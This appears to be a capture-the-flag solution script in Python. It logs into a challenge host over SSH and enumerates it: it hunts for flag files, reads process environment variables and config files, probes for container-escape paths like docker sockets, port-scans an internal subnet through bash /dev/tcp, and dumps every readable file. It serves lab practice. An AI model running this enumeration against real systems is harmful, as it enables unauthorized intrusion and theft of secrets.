#!/usr/bin/env python3
"""
Stolen Schematics - Flag Hunt
Looking for flag.txt or /etc/flag.txt and exploring accessible files
"""

import paramiko
import time
import sys

HOST = "instance.ctf.tdho.st"
PORT = 32867
USER = "player"
PASSWORD = "reyalp"

def execute_command(ssh, command, wait_time=2):
    """Execute a command and return output"""
    try:
        stdin, stdout, stderr = ssh.exec_command(command, timeout=15)
        time.sleep(wait_time)
        
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        print(f"\n[CMD] {command}")
        if output:
            print(output)
        if error and "Permission denied" not in error and "No such file" not in error and error.strip():
            print(f"[ERR] {error}")
        
        return output, error
    except Exception as e:
        print(f"[-] Error executing '{command}': {e}")
        return "", str(e)

def main():
    print("="*70)
    print("Stolen Schematics - Flag Hunt & Deeper Exploration")
    print("="*70)
    
    try:
        import paramiko
        
        print(f"\n[*] Connecting to {HOST}:{PORT}...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD, timeout=30)
        print("[+] Connected!")
        
        # Check for flag in common locations
        print("\n" + "="*70)
        print("CHECKING FLAG LOCATIONS")
        print("="*70)
        
        flag_commands = [
            "cat flag.txt 2>/dev/null || echo 'No flag.txt in current dir'",
            "cat /etc/flag.txt 2>/dev/null || echo 'No /etc/flag.txt'",
            "cat /flag.txt 2>/dev/null || echo 'No /flag.txt'",
            "cat /root/flag.txt 2>/dev/null || echo 'No /root/flag.txt'",
            "cat /home/player/flag.txt 2>/dev/null || echo 'No flag in home'",
            "ls -la /etc/flag* 2>/dev/null || echo 'No flag files in /etc'",
            "find / -name 'flag.txt' 2>/dev/null | head -20",
            "find / -name '*flag*' -type f 2>/dev/null | head -30",
        ]
        
        for cmd in flag_commands:
            execute_command(ssh, cmd, wait_time=3)
        
        # Read the accessible config files we found
        print("\n" + "="*70)
        print("READING ACCESSIBLE MINECRAFT CONFIG FILES")
        print("="*70)
        
        config_commands = [
            "cat /opt/mc/config/sync-request.conf",
            "cat /opt/mc/logs/latest.log 2>/dev/null | tail -50",
            "cat /opt/mc/server.properties",
            "ls -la /opt/mc/plugins",
            "find /opt/mc -type f -readable 2>/dev/null",
        ]
        
        for cmd in config_commands:
            execute_command(ssh, cmd)
        
        # Check for any hints about the registry or other containers
        print("\n" + "="*70)
        print("SEARCHING FOR GHCR.IO / REGISTRY INFORMATION")
        print("="*70)
        
        registry_commands = [
            "cat /etc/resolv.conf",
            "cat /etc/hosts",
            "env | grep -i image",
            "env | grep -i container",
            "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -v '^$' | sort",
        ]
        
        for cmd in registry_commands:
            execute_command(ssh, cmd)
        
        # Check what's in the sync volume from host
        print("\n" + "="*70)
        print("EXPLORING SYNC VOLUME MOUNT")
        print("="*70)
        
        sync_commands = [
            "ls -la /opt/mc/.sync",
            "cat /proc/mounts | grep sync",
            "mount | grep sync",
        ]
        
        for cmd in sync_commands:
            execute_command(ssh, cmd)
        
        # Try to read sync-loop.sh indirectly
        print("\n" + "="*70)
        print("TRYING TO UNDERSTAND SYNC-LOOP.SH")
        print("="*70)
        
        sync_loop_commands = [
            "ls -la /opt/mc/scripts/sync-loop.sh",
            "file /opt/mc/scripts/sync-loop.sh",
            "strings /opt/mc/scripts/sync-loop.sh 2>/dev/null || echo 'Cannot read'",
            "ps aux | grep sync-loop",
            "cat /proc/16/cmdline 2>/dev/null | tr '\\0' ' '",  # PID 16 runs sync-loop
            "cat /proc/16/environ 2>/dev/null | tr '\\0' '\\n'",
        ]
        
        for cmd in sync_loop_commands:
            execute_command(ssh, cmd)
        
        # Check if we can access docker from inside
        print("\n" + "="*70)
        print("CONTAINER ESCAPE CHECKS")
        print("="*70)
        
        escape_commands = [
            "which docker",
            "which kubectl",
            "which crictl",
            "ls -la /run/docker.sock 2>/dev/null || echo 'No docker socket'",
            "ls -la /var/run/docker.sock 2>/dev/null || echo 'No docker socket'",
            "cat /proc/self/cgroup",
            "cat /proc/1/mountinfo | grep docker | head -10",
            "ip addr 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/fib_trie",
        ]
        
        for cmd in escape_commands:
            execute_command(ssh, cmd)
        
        # Try to scan network for other containers
        print("\n" + "="*70)
        print("NETWORK SCAN FOR GAME SERVER")
        print("="*70)
        
        # Based on our IP 172.27.0.3, let's check the network
        network_commands = [
            "cat /proc/net/arp 2>/dev/null || echo 'No arp'",
            "cat /proc/net/route",
            "for i in 1 2 4 5 6 7 8 9 10; do timeout 1 bash -c 'echo > /dev/tcp/172.27.0.$i/25565' 2>&1 && echo \"172.27.0.$i:25565 open\" || echo \"172.27.0.$i:25565 closed/filtered\"; done",
            "for i in 1 2 4 5 6 7 8 9 10; do timeout 1 bash -c 'echo > /dev/tcp/172.27.0.$i/80' 2>&1 && echo \"172.27.0.$i:80 open\" || echo \"172.27.0.$i:80 closed/filtered\"; done",
        ]
        
        for cmd in network_commands:
            execute_command(ssh, cmd, wait_time=5)
        
        # Check all readable files in /opt/mc
        print("\n" + "="*70)
        print("DUMPING ALL READABLE FILES IN /opt/mc")
        print("="*70)
        
        dump_commands = [
            "find /opt/mc -type f -readable -exec echo '=== {} ===' \\; -exec cat {} \\; 2>/dev/null | head -200",
        ]
        
        for cmd in dump_commands:
            execute_command(ssh, cmd, wait_time=4)
        
        ssh.close()
        print("\n[+] Exploration complete!")
        
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
